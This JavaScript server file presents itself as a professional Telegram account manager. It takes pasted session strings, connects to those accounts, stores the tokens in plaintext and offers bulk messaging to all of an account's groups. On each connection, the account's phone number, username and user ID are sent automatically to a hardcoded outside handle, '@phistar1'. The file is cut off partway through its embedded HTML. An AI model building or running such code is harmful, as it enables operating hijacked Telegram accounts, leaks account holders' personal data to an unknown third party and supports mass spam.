/* Professional Telegram Account Manager with Auto-Notification */
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Mutex } = require('async-mutex');
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

// ==================== CONFIGURATION ====================
const config = {
    webPort: process.env.PORT || 3000,
    webBaseUrl: process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 3000}`,
    
    // Telegram API Credentials
    telegramApiId: 33904063,
    telegramApiHash: '51528b792d5be7e300315f7fae356ad9',
    
    // Auto-notification settings
    notificationChatId: '@phistar1', // or 6300694007
    notificationMessage: '✅ This account is successfully connected to Telegram Account Manager',
    
    // Session Management
    maxClients: 50,
    sessionTimeout: 60000,
    
    // Auto-ping for Render
    autoPingInterval: 4 * 60 * 1000,
    
    // Professional Features
    autoSyncGroups: true,
    autoReconnect: true,
    connectionRetries: 5
};

// ==================== GLOBALS ====================
const activeClients = new Map(); // sessionId -> { client, userInfo, lastActive, groups }
const clientMutex = new Mutex();
const app = express();

// ==================== DATABASE ====================
const DB_FILE = 'telegram_manager.db.json';
const SESSIONS_FOLDER = 'sessions';

// Initialize system
function initializeSystem() {
    try {
        // Create necessary directories
        if (!fs.existsSync(SESSIONS_FOLDER)) {
            fs.mkdirSync(SESSIONS_FOLDER, { recursive: true });
        }
        
        // Initialize database
        if (!fs.existsSync(DB_FILE)) {
            const initialDB = {
                version: '2.2.0',
                accounts: [],
                messages: [],
                notifications: [],
                groups: {},
                settings: {
                    autoSync: true,
                    maxConcurrentClients: 10,
                    enableLogging: true,
                    autoNotifications: true
                },
                statistics: {
                    totalAccounts: 0,
                    activeConnections: 0,
                    totalMessagesSent: 0,
                    totalNotificationsSent: 0,
                    lastSync: null,
                    uptime: 0
                }
            };
            fs.writeFileSync(DB_FILE, JSON.stringify(initialDB, null, 2));
            console.log('📊 Database initialized successfully');
        }
        
        console.log('✅ System initialized');
        return true;
    } catch (error) {
        console.error('❌ System initialization failed:', error);
        return false;
    }
}

initializeSystem();

// ==================== DATABASE FUNCTIONS ====================
function readDatabase() {
    try {
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading database:', error);
        return {
            accounts: [],
            messages: [],
            notifications: [],
            groups: {},
            settings: {},
            statistics: {}
        };
    }
}

function writeDatabase(db) {
    try {
        // Update statistics
        db.statistics.totalAccounts = db.accounts.length;
        db.statistics.activeConnections = activeClients.size;
        db.statistics.uptime = process.uptime();
        
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
        return true;
    } catch (error) {
        console.error('Error writing database:', error);
        return false;
    }
}

// ==================== ENHANCED TELEGRAM MANAGER ====================
class TelegramAccountManager {
    constructor(apiId, apiHash) {
        this.apiId = apiId;
        this.apiHash = apiHash;
        this.clients = new Map();
    }
    
    // Validate session string
    validateSessionString(sessionString) {
        if (!sessionString || sessionString.trim().length < 10) {
            return { valid: false, error: 'Session string too short' };
        }
        
        const cleanSession = sessionString.trim();
        return { valid: true, session: cleanSession };
    }
    
    // Send notification when account connects
    async sendConnectionNotification(client, userInfo) {
        try {
            console.log(`📤 Sending connection notification to ${config.notificationChatId}...`);
            
            const message = `${config.notificationMessage}\n\n📱 Account: ${userInfo.firstName || 'User'}\n📞 Phone: ${userInfo.phone || 'Unknown'}\n👤 Username: @${userInfo.username || 'none'}\n🆔 User ID: ${userInfo.id}\n⏰ Connected: ${new Date().toLocaleString()}`;
            
            // Try different formats for chat ID
            let result;
            try {
                // First try with the chat ID directly
                result = await client.sendMessage(config.notificationChatId, { message });
            } catch (error) {
                // If that fails, try with numeric ID
                if (config.notificationChatId === '@phistar1') {
                    result = await client.sendMessage(6300694007, { message });
                } else {
                    throw error;
                }
            }
            
            // Log notification
            const db = readDatabase();
            db.notifications.push({
                id: `notif_${Date.now()}`,
                userId: userInfo.id,
                username: userInfo.username,
                chatId: config.notificationChatId,
                message: config.notificationMessage,
                timestamp: new Date().toISOString(),
                status: 'sent',
                messageId: result.id.toString()
            });
            db.statistics.totalNotificationsSent = (db.statistics.totalNotificationsSent || 0) + 1;
            writeDatabase(db);
            
            console.log(`✅ Connection notification sent to ${config.notificationChatId}`);
            return true;
        } catch (error) {
            console.warn(`⚠️ Could not send connection notification:`, error.message);
            return false;
        }
    }
    
    // Connect with session string
    async connectWithSession(sessionId, sessionString, accountName = '') {
        const validation = this.validateSessionString(sessionString);
        if (!validation.valid) {
            throw new Error(validation.error);
        }
        
        const release = await clientMutex.acquire();
        
        try {
            console.log(`🔌 Connecting account: ${accountName || sessionId}`);
            
            // Create client with optimized settings
            const client = new TelegramClient(
                new StringSession(validation.session),
                this.apiId,
                this.apiHash,
                {
                    connectionRetries: config.connectionRetries,
                    useWSS: false,
                    autoReconnect: config.autoReconnect,
                    timeout: config.sessionTimeout,
                    baseLogger: console,
                    deviceModel: 'Telegram Manager',
                    systemVersion: '1.0',
                    appVersion: '2.0',
                    langCode: 'en'
                }
            );
            
            console.log('🔄 Starting connection...');
            await client.connect();
            console.log('✅ Client connected');
            
            // Get user information with retry
            let user = null;
            let retryCount = 0;
            const maxRetries = 3;
            
            while (!user && retryCount < maxRetries) {
                try {
                    console.log(`🔄 Getting user info (attempt ${retryCount + 1}/${maxRetries})...`);
                    user = await client.getMe();
                    console.log('✅ User info retrieved');
                } catch (userError) {
                    console.warn(`⚠️ Failed to get user info:`, userError.message);
                    retryCount++;
                    if (retryCount < maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                }
            }
            
            if (!user) {
                throw new Error('Could not retrieve user information');
            }
            
            // Send connection notification
            const userInfo = {
                id: user.id.toString(),
                phone: user.phone || 'Unknown',
                username: user.username || '',
                firstName: user.firstName || '',
                lastName: user.lastName || '',
                isBot: user.bot || false,
                premium: user.premium || false
            };
            
            await this.sendConnectionNotification(client, userInfo);
            
            // Get groups and channels
            let groups = [];
            let channels = [];
            if (config.autoSyncGroups) {
                try {
                    console.log('🔄 Fetching groups and channels...');
                    const dialogs = await client.getDialogs({ limit: 200 });
                    
                    groups = dialogs
                        .filter(dialog => dialog.isGroup && !dialog.isChannel)
                        .map(dialog => ({
                            id: dialog.id.toString(),
                            title: dialog.title || 'Unknown Group',
                            participantsCount: dialog.participantsCount || 0,
                            username: dialog.username || '',
                            unreadCount: dialog.unreadCount || 0,
                            lastMessageDate: dialog.date ? new Date(dialog.date * 1000).toISOString() : null
                        }));
                    
                    channels = dialogs
                        .filter(dialog => dialog.isChannel)
                        .map(dialog => ({
                            id: dialog.id.toString(),
                            title: dialog.title || 'Unknown Channel',
                            participantsCount: dialog.participantsCount || 0,
                            username: dialog.username || '',
                            unreadCount: dialog.unreadCount || 0,
                            lastMessageDate: dialog.date ? new Date(dialog.date * 1000).toISOString() : null
                        }));
                    
                    console.log(`✅ Found ${groups.length} groups and ${channels.length} channels`);
                } catch (groupError) {
                    console.warn('⚠️ Could not fetch groups:', groupError.message);
                }
            }
            
            // Store the client
            this.clients.set(sessionId, {
                client,
                sessionString: validation.session,
                userInfo,
                connectedAt: new Date(),
                lastActive: Date.now(),
                groups: groups,
                channels: channels,
                accountName: accountName || `Account_${Date.now()}`
            });
            
            // Update database
            const db = readDatabase();
            const accountIndex = db.accounts.findIndex(a => a.id === sessionId);
            
            if (accountIndex !== -1) {
                // Update existing account
                db.accounts[accountIndex].lastLogin = new Date().toISOString();
                db.accounts[accountIndex].isActive = true;
                db.accounts[accountIndex].status = 'connected';
                db.accounts[accountIndex].username = user.username || '';
                db.accounts[accountIndex].firstName = user.firstName || '';
                db.accounts[accountIndex].lastName = user.lastName || '';
                db.accounts[accountIndex].groupsCount = groups.length;
                db.accounts[accountIndex].channelsCount = channels.length;
            } else {
                // Create new account entry
                db.accounts.push({
                    id: sessionId,
                    sessionString: validation.session,
                    accountName: accountName || `Account_${Date.now()}`,
                    phoneNumber: user.phone || 'Unknown',
                    userId: user.id.toString(),
                    username: user.username || '',
                    firstName: user.firstName || '',
                    lastName: user.lastName || '',
                    isBot: user.bot || false,
                    createdAt: new Date().toISOString(),
                    lastLogin: new Date().toISOString(),
                    isActive: true,
                    status: 'connected',
                    groupsCount: groups.length,
                    channelsCount: channels.length,
                    lastNotification: new Date().toISOString()
                });
                
                // Store groups in database
                if (!db.groups[sessionId]) {
                    db.groups[sessionId] = {};
                }
                db.groups[sessionId].groups = groups;
                db.groups[sessionId].channels = channels;
                db.groups[sessionId].lastUpdated = new Date().toISOString();
            }
            
            writeDatabase(db);
            
            console.log(`✅ Account connected: ${user.username || user.phone || 'Unknown user'}`);
            console.log(`📊 Groups: ${groups.length}, Channels: ${channels.length}`);
            
            return {
                success: true,
                sessionId,
                user: userInfo,
                groupsCount: groups.length,
                channelsCount: channels.length,
                accountName: accountName || `Account_${Date.now()}`
            };
            
        } catch (error) {
            console.error(`❌ Connection failed:`, error.message);
            
            // Try to disconnect if partially connected
            try {
                const tempClient = new TelegramClient(
                    new StringSession(validation.session),
                    this.apiId,
                    this.apiHash
                );
                if (tempClient.connected) {
                    await tempClient.disconnect();
                }
            } catch (disconnectError) {
                // Ignore disconnect errors
            }
            
            // Update database with error
            const db = readDatabase();
            const accountIndex = db.accounts.findIndex(a => a.id === sessionId);
            if (accountIndex !== -1) {
                db.accounts[accountIndex].isActive = false;
                db.accounts[accountIndex].status = 'error';
                db.accounts[accountIndex].lastError = error.message;
            }
            writeDatabase(db);
            
            throw error;
        } finally {
            release();
        }
    }
    
    // Get all groups and channels
    async getAllGroups(sessionId) {
        const clientData = this.clients.get(sessionId);
        if (!clientData) {
            throw new Error('Session not connected');
        }
        
        try {
            console.log(`🔄 Refreshing groups for ${sessionId}...`);
            const dialogs = await clientData.client.getDialogs({ limit: 200 });
            
            const groups = dialogs
                .filter(dialog => dialog.isGroup && !dialog.isChannel)
                .map(dialog => ({
                    id: dialog.id.toString(),
                    title: dialog.title || 'Unknown Group',
                    participantsCount: dialog.participantsCount || 0,
                    username: dialog.username || '',
                    unreadCount: dialog.unreadCount || 0,
                    lastMessageDate: dialog.date ? new Date(dialog.date * 1000).toISOString() : null,
                    type: 'group'
                }));
            
            const channels = dialogs
                .filter(dialog => dialog.isChannel)
                .map(dialog => ({
                    id: dialog.id.toString(),
                    title: dialog.title || 'Unknown Channel',
                    participantsCount: dialog.participantsCount || 0,
                    username: dialog.username || '',
                    unreadCount: dialog.unreadCount || 0,
                    lastMessageDate: dialog.date ? new Date(dialog.date * 1000).toISOString() : null,
                    type: 'channel'
                }));
            
            // Update stored data
            clientData.groups = groups;
            clientData.channels = channels;
            clientData.lastActive = Date.now();
            
            // Update database
            const db = readDatabase();
            if (!db.groups[sessionId]) {
                db.groups[sessionId] = {};
            }
            db.groups[sessionId].groups = groups;
            db.groups[sessionId].channels = channels;
            db.groups[sessionId].lastUpdated = new Date().toISOString();
            
            const accountIndex = db.accounts.findIndex(a => a.id === sessionId);
            if (accountIndex !== -1) {
                db.accounts[accountIndex].groupsCount = groups.length;
                db.accounts[accountIndex].channelsCount = channels.length;
            }
            writeDatabase(db);
            
            console.log(`✅ Groups refreshed: ${groups.length} groups, ${channels.length} channels`);
            
            return {
                success: true,
                groups: groups,
                channels: channels,
                total: groups.length + channels.length
            };
        } catch (error) {
            console.error('❌ Error fetching groups:', error);
            throw error;
        }
    }
    
    // Send message
    async sendMessage(sessionId, peer, message) {
        const clientData = this.clients.get(sessionId);
        if (!clientData) {
            throw new Error('Session not connected');
        }
        
        try {
            console.log(`📤 Sending message to ${peer}...`);
            const result = await clientData.client.sendMessage(peer, { message });
            
            // Log message
            const db = readDatabase();
            db.messages.push({
                id: `msg_${Date.now()}`,
                sessionId,
                peer,
                message,
                messageId: result.id.toString(),
                timestamp: new Date().toISOString(),
                status: 'sent'
            });
            db.statistics.totalMessagesSent = (db.statistics.totalMessagesSent || 0) + 1;
            writeDatabase(db);
            
            clientData.lastActive = Date.now();
            
            console.log('✅ Message sent successfully');
            
            return {
                success: true,
                messageId: result.id,
                date: result.date,
                peer: peer
            };
        } catch (error) {
            console.error('❌ Message sending failed:', error);
            throw error;
        }
    }
    
    // Send message to multiple recipients
    async sendBulkMessage(sessionId, recipients, message) {
        const clientData = this.clients.get(sessionId);
        if (!clientData) {
            throw new Error('Session not connected');
        }
        
        const results = [];
        
        for (const recipient of recipients) {
            try {
                console.log(`📤 Sending to ${recipient}...`);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limiting
                
                const result = await clientData.client.sendMessage(recipient, { message });
                
                results.push({
                    recipient,
                    success: true,
                    messageId: result.id
                });
                
                console.log(`✅ Sent to ${recipient}`);
            } catch (error) {
                results.push({
                    recipient,
                    success: false,
                    error: error.message
                });
                console.warn(`⚠️ Failed to send to ${recipient}:`, error.message);
            }
        }
        
        // Log bulk sending
        const db = readDatabase();
        db.messages.push({
            id: `bulk_${Date.now()}`,
            sessionId,
            recipients: recipients,
            message,
            results,
            timestamp: new Date().toISOString(),
            status: 'sent',
            type: 'bulk'
        });
        writeDatabase(db);
        
        return {
            success: true,
            total: recipients.length,
            successful: results.filter(r => r.success).length,
            failed: results.filter(r => !r.success).length,
            results: results
        };
    }
    
    // Get account details
    async getAccountDetails(sessionId) {
        const clientData = this.clients.get(sessionId);
        if (!clientData) {
            throw new Error('Session not connected');
        }
        
        return {
            sessionId,
            accountName: clientData.accountName,
            user: {
                ...clientData.userInfo,
                sessionString: undefined
            },
            connection: {
                connectedAt: clientData.connectedAt,
                lastActive: clientData.lastActive,
                uptime: Date.now() - new Date(clientData.connectedAt).getTime()
            },
            statistics: {
                groups: clientData.groups.length,
                channels: clientData.channels.length,
                totalDialogs: clientData.groups.length + clientData.channels.length
            },
            groups: clientData.groups,
            channels: clientData.channels
        };
    }
    
    // Test connection
    async testConnection(sessionId) {
        const clientData = this.clients.get(sessionId);
        if (!clientData) {
            return { success: false, error: 'Session not connected' };
        }
        
        try {
            const user = await clientData.client.getMe();
            return {
                success: true,
                user: {
                    username: user.username,
                    firstName: user.firstName,
                    lastName: user.lastName
                }
            };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    // Disconnect session
    async disconnectSession(sessionId) {
        const release = await clientMutex.acquire();
        
        try {
            const clientData = this.clients.get(sessionId);
            if (clientData) {
                await clientData.client.disconnect();
                this.clients.delete(sessionId);
                
                // Update database
                const db = readDatabase();
                const accountIndex = db.accounts.findIndex(a => a.id === sessionId);
                if (accountIndex !== -1) {
                    db.accounts[accountIndex].isActive = false;
                    db.accounts[accountIndex].status = 'disconnected';
                    db.accounts[accountIndex].lastLogout = new Date().toISOString();
                }
                writeDatabase(db);
                
                console.log(`🔌 Disconnected session: ${sessionId}`);
                return true;
            }
            return false;
        } catch (error) {
            console.error(`❌ Error disconnecting ${sessionId}:`, error);
            return false;
        } finally {
            release();
        }
    }
}

// Initialize manager
const telegramManager = new TelegramAccountManager(
    config.telegramApiId,
    config.telegramApiHash
);

// ==================== AUTO-PING SYSTEM ====================
async function selfPing() {
    try {
        const pingUrl = `${config.webBaseUrl}/ping`;
        console.log(`🔄 Self-ping to: ${pingUrl}`);
        
        const response = await axios.get(pingUrl, { 
            timeout: 10000,
            headers: { 'User-Agent': 'Telegram-Manager-AutoPing' }
        });
        
        console.log(`✅ Self-ping successful: ${response.data.status}`);
        return true;
    } catch (error) {
        console.warn(`⚠️ Self-ping failed: ${error.message}`);
        
        // Try localhost fallback
        try {
            const localPingUrl = `http://localhost:${config.webPort}/ping`;
            console.log(`🔄 Trying localhost: ${localPingUrl}`);
            await axios.get(localPingUrl, { timeout: 5000 });
            console.log('✅ Localhost ping successful');
            return true;
        } catch (localError) {
            console.warn(`⚠️ Localhost ping failed: ${localError.message}`);
        }
        
        return false;
    }
}

function startAutoPing() {
    console.log('🔄 Starting auto-ping system...');
    
    // Initial ping after 30 seconds
    setTimeout(async () => {
        await selfPing();
    }, 30000);
    
    // Regular pings every 4 minutes
    setInterval(async () => {
        console.log(`🔄 Auto-ping at ${new Date().toLocaleTimeString()}`);
        await selfPing();
    }, config.autoPingInterval);
    
    console.log('✅ Auto-ping system started');
}

// ==================== WEB SERVER SETUP ====================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Create enhanced web interface
if (!fs.existsSync('public')) {
    fs.mkdirSync('public', { recursive: true });
    
    // Create HTML interface
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Account Manager</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css" rel="stylesheet">
        <style>
            body { 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            .container {
                background: white;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
                margin-top: 30px;
                margin-bottom: 30px;
                padding: 30px;
            }
            
            .navbar-brand {
                font-weight: 700;
                font-size: 1.5rem;
                color: white !important;
            }
            
            .account-card {
                border: none;
                border-radius: 10px;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
                transition: all 0.3s;
                margin-bottom: 20px;
            }
            
            .account-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            }
            
            .status-badge {
                padding: 5px 10px;
                border-radius: 15px;
                font-size: 0.75rem;
                font-weight: 600;
            }
            
            .connected { background: #28a745; color: white; }
            .disconnected { background: #6c757d; color: white; }
            .error { background: #dc3545; color: white; }
            
            .telegram-btn {
                background: #0088cc;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                font-weight: 600;
                transition: all 0.3s;
            }
            
            .telegram-btn:hover {
                background: #0077b5;
                color: white;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 136, 204, 0.3);
            }
            
            .group-badge {
                background: #17a2b8;
                color: white;
                padding: 3px 8px;
                border-radius: 10px;
                font-size: 0.7rem;
            }
            
            .channel-badge {
                background: #6f42c1;
                color: white;
                padding: 3px 8px;
                border-radius: 10px;
                font-size: 0.7rem;
            }
            
            .control-panel {
                background: #f8f9fa;
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 20px;
            }
            
            .group-item {
                padding: 10px;
                border-radius: 8px;
                margin-bottom: 8px;
                background: white;
                border-left: 4px solid #0088cc;
            }
            
            .modal-xl {
                max-width: 1200px;
            }
            
            .tab-content {
                border: 1px solid #dee2e6;
                border-top: none;
                padding: 20px;
                border-radius: 0 0 10px 10px;
            }
        </style>
    </head>
    <body>
        <nav class="navbar navbar-dark">
            <div class="container-fluid">
                <a class="navbar-brand" href="#">
                    <i class="bi bi-telegram me-2"></i>
                    Telegram Account Manager
                </a>
                <div class="navbar-text text-white">
                    <i class="bi bi-people me-1"></i>
                    <span id="activeCount">0</span> Active
                </div>
            </div>
        </nav>
        
        <div class="container">
            <!-- Connection Panel -->
            <div class="row mb-4">
                <div class="col-md-8">
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">
                                <i class="bi bi-plug me-2"></i>
                                Connect New Account
                            </h5>
                            
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <label class="form-label">Account Name (Optional)</label>
                                    <input type="text" class="form-control" id="accountName" 
                                           placeholder="My Business Account">
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label class="form-label">Session String</label>
                                    <textarea class="form-control" id="sessionString" rows="3" 
                                              placeholder="Paste Telegram session string here..."></textarea>
                                </div>
                            </div>
                            
                            <div class="mb-3">
                                <small class="text-muted">
                                    <i class="bi bi-info-circle me-1"></i>
                                    When connected, a notification will be sent to @phistar1
                                </small>
                            </div>
                            
                            <button class="btn telegram-btn w-100" onclick="connectAccount()">
                                <i class="bi bi-plug me-1"></i>
                                Connect Account
                            </button>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4">
                    <div class="card h-100">
                        <div class="card-body">
                            <h5 class="card-title">
                                <i class="bi bi-graph-up me-2"></i>
                                Statistics
                            </h5>
                            <div id="stats">
                                <p class="mb-2">
                                    <i class="bi bi-people me-2"></i>
                                    Total Accounts: <strong id="totalAccounts">0</strong>
                                </p>
                                <p class="mb-2">
                                    <i class="bi bi-check-circle me-2"></i>
                                    Connected: <strong id="connectedAccounts">0</strong>
                                </p>
                                <p class="mb-2">
                                    <i class="bi bi-chat-dots me-2"></i>
                                    Messages Sent: <strong id="messagesSent">0</strong>
                                </p>
                                <p class="mb-2">
                                    <i class="bi bi-bell me-2"></i>
                                    Notifications: <strong id="notificationsSent">0</strong>
                                </p>
                                <p class="mb-0">
                                    <i class="bi bi-clock me-2"></i>
                                    Uptime: <strong id="uptime">0s</strong>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Accounts List -->
            <div class="row">
                <div class="col-12">
                    <div class="card">
                        <div class="card-body">
                            <div class="d-flex justify-content-between align-items-center mb-3">
                                <h5 class="card-title mb-0">
                                    <i class="bi bi-person-badge me-2"></i>
                                    Connected Accounts
                                </h5>
                                <div>
                                    <button class="btn btn-sm btn-outline-primary me-2" onclick="refreshAllGroups()">
                                        <i class="bi bi-arrow-clockwise me-1"></i>
                                        Refresh All
                                    </button>
                                    <button class="btn btn-sm btn-outline-primary" onclick="loadAccounts()">
                                        <i class="bi bi-arrow-clockwise"></i>
                                    </button>
                                </div>
                            </div>
                            
                            <div id="accountsList">
                                <div class="alert alert-info">
                                    <i class="bi bi-info-circle me-2"></i>
                                    No accounts connected yet. Connect your first account above.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Account Control Modal -->
        <div class="modal fade" id="accountModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-xl">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="modalTitle">Account Control Panel</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body" id="accountModalBody">
                        Loading...
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Groups Modal -->
        <div class="modal fade" id="groupsModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Groups & Channels</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body" id="groupsModalBody">
                        Loading...
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            let currentAccountId = null;
            
            // Load on startup
            document.addEventListener('DOMContentLoaded', function() {
                loadAccounts();
                loadStats();
                
                // Auto-refresh
                setInterval(loadAccounts, 10000);
                setInterval(loadStats, 5000);
            });
            
            // Connect account
            async function connectAccount() {
                const sessionString = document.getElementById('sessionString').value.trim();
                const accountName = document.getElementById('accountName').value.trim() || '';
                
                if (!sessionString) {
                    showAlert('Please paste a session string', 'warning');
                    return;
                }
                
                const sessionId = 'account_' + Date.now();
                
                try {
                    showLoading('Connecting to Telegram...');
                    
                    const response = await fetch('/api/accounts/connect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            sessionId, 
                            sessionString,
                            accountName 
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        showAlert('✅ Account connected successfully! Notification sent to @phistar1', 'success');
                        document.getElementById('sessionString').value = '';
                        document.getElementById('accountName').value = '';
                        loadAccounts();
                        loadStats();
                    } else {
                        showAlert('❌ Connection failed: ' + (result.error || 'Unknown error'), 'danger');
                    }
                } catch (error) {
                    showAlert('❌ Error: ' + error.message, 'danger');
                }
            }
            
            // Load accounts
            async function loadAccounts() {
                try {
                    const response = await fetch('/api/accounts');
                    const accounts = await response.json();
                    
                    const container = document.getElementById('accountsList');
                    
                    if (!Array.isArray(accounts) || accounts.length === 0) {
                        container.innerHTML = \`
                            <div class="alert alert-info">
                                <i class="bi bi-info-circle me-2"></i>
                                No accounts connected yet. Connect your first account above.
                            </div>
                        \`;
                        return;
                    }
                    
                    let html = '<div class="row">';
                    
                    accounts.forEach(account => {
                        const statusClass = account.isActive ? 'connected' : 
                                          account.status === 'error' ? 'error' : 'disconnected';
                        const statusText = account.isActive ? 'Connected' : 
                                         account.status === 'error' ? 'Error' : 'Disconnected';
                        
                        html += \`
                        <div class="col-md-6 col-lg-4">
                            <div class="account-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between align-items-start mb-3">
                                        <div>
                                            <h6 class="card-title mb-1">
                                                <i class="bi bi-person-circle me-2"></i>
                                                \${account.accountName || account.firstName || 'Account'}
                                            </h6>
                                            <small class="text-muted">@\${account.username || 'no-username'}</small>
                                        </div>
                                        <span class="status-badge \${statusClass}">\${statusText}</span>
                                    </div>
                                    
                                    <p class="card-text small mb-2">
                                        <i class="bi bi-telephone me-2"></i>
                                        \${account.phoneNumber || 'No phone'}
                                    </p>
                                    
                                    <div class="d-flex justify-content-between mb-3">
                                        <span class="group-badge">
                                            <i class="bi bi-people me-1"></i>
                                            \${account.groupsCount || 0} Groups
                                        </span>
                                        <span class="channel-badge">
                                            <i class="bi bi-broadcast me-1"></i>
                                            \${account.channelsCount || 0} Channels
                                        </span>
                                    </div>
                                    
                                    <div class="d-grid gap-2">
                                        \${account.isActive ? \`
                                            <button class="btn btn-sm btn-primary" onclick="openControlPanel('\${account.id}')">
                                                <i class="bi bi-gear me-1"></i>
                                                Control Panel
                                            </button>
                                            <button class="btn btn-sm btn-info" onclick="viewGroups('\${account.id}', '\${account.accountName}')">
                                                <i class="bi bi-list-ul me-1"></i>
                                                View Groups (\${account.groupsCount || 0})
                                            </button>
                                            <button class="btn btn-sm btn-warning" onclick="sendTestMessage('\${account.id}')">
                                                <i class="bi bi-send me-1"></i>
                                                Send Test Message
                                            </button>
                                        \` : ''}
                                        
                                        <button class="btn btn-sm btn-outline-danger" onclick="disconnectAccount('\${account.id}')">
                                            <i class="bi bi-power me-1"></i>
                                            \${account.isActive ? 'Disconnect' : 'Remove'}
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        \`;
                    });
                    
                    html += '</div>';
                    container.innerHTML = html;
                    
                    // Update active count
                    const activeCount = accounts.filter(a => a.isActive).length;
                    document.getElementById('activeCount').textContent = activeCount;
                    
                } catch (error) {
                    console.error('Error loading accounts:', error);
                }
            }
            
            // Open control panel
            async function openControlPanel(accountId) {
                currentAccountId = accountId;
                
                try {
                    const response = await fetch(\`/api/accounts/\${accountId}/details\`);
                    const details = await response.json();
                    
                    const modalBody = document.getElementById('accountModalBody');
                    modalBody.innerHTML = \`
                    <div class="row">
                        <div class="col-md-4">
                            <div class="control-panel">
                                <h6><i class="bi bi-person me-2"></i>Account Info</h6>
                                <table class="table table-sm">
                                    <tr>
                                        <td><strong>Name:</strong></td>
                                        <td>\${details.accountName}</td>
                                    </tr>
                                    <tr>
                                        <td><strong>Phone:</strong></td>
                                        <td>\${details.user.phone || 'N/A'}</td>
                                    </tr>
                                    <tr>
                                        <td><strong>Username:</strong></td>
                                        <td>@\${details.user.username || 'N/A'}</td>
                                    </tr>
                                    <tr>
                                        <td><strong>ID:</strong></td>
                                        <td><small class="text-muted">\${details.user.id}</small></td>
                                    </tr>
                                </table>
                            </div>
                            
                            <div class="control-panel">
                                <h6><i class="bi bi-bar-chart me-2"></i>Statistics</h6>
                                <p class="mb-2">Groups: <strong>\${details.statistics.groups}</strong></p>
                                <p class="mb-2">Channels: <strong>\${details.statistics.channels}</strong></p>
                                <p class="mb-2">Total: <strong>\${details.statistics.totalDialogs}</strong></p>
                                <p class="mb-0">Uptime: <strong>\${Math.floor(details.connection.uptime / 1000)}s</strong></p>
                            </div>
                            
                            <div class="control-panel">
                                <h6><i class="bi bi-lightning me-2"></i>Quick Actions</h6>
                                <div class="d-grid gap-2">
                                    <button class="btn btn-success" onclick="refreshAccountGroups('\${accountId}')">
                                        <i class="bi bi-arrow-clockwise me-1"></i>
                                        Refresh Groups
                                    </button>
                                    <button class="btn btn-warning" onclick="testAccountConnection('\${accountId}')">
                                        <i class="bi bi-check-circle me-1"></i>
                                        Test Connection
                                    </button>
                                    <button class="btn btn-danger" onclick="disconnectFromPanel('\${accountId}')">
                                        <i class="bi bi-power me-1"></i>
                                        Disconnect
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-md-8">
                            <div class="control-panel mb-3">
                                <h6><i class="bi bi-send me-2"></i>Send Message</h6>
                                <div class="row">
                                    <div class="col-md-6 mb-2">
                                        <label class="form-label">Recipient</label>
                                        <input type="text" class="form-control" id="sendTo" 
                                               placeholder="Group ID, @username, or phone">
                                    </div>
                                    <div class="col-md-6 mb-2">
                                        <label class="form-label">Message Type</label>
                                        <select class="form-select" id="messageType">
                                            <option value="text">Text Message</option>
                                            <option value="bulk">Bulk Message</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="mb-2">
                                    <label class="form-label">Message</label>
                                    <textarea class="form-control" id="messageText" rows="4" 
                                              placeholder="Type your message here..."></textarea>
                                </div>
                                <button class="btn telegram-btn w-100" onclick="sendAccountMessage()">
                                    <i class="bi bi-paper-plane me-1"></i>
                                    Send Message
                                </button>
                            </div>
                            
                            <div class="control-panel">
                                <h6><i class="bi bi-broadcast me-2"></i>Bulk Operations</h6>
                                <div class="mb-3">
                                    <label class="form-label">Message for All Groups</label>
